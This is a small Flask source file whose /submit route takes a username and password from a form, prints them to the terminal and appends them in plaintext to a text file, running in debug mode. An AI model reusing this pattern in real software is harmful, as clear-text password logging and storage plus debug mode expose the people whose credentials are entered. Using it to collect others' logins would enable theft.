from flask import Flask, request, render_template

app = Flask(__name__)

# Route to render the HTML page
@app.route('/')
def index():
    return render_template('index.html')

# Route to handle form submission
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    # Display in terminal
    print(f"Username: {username}, Password: {password}")

    # Save to a text file
    with open("user_data.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")

    return "Data received and saved!"

if __name__ == '__main__':
    app.run(debug=True)
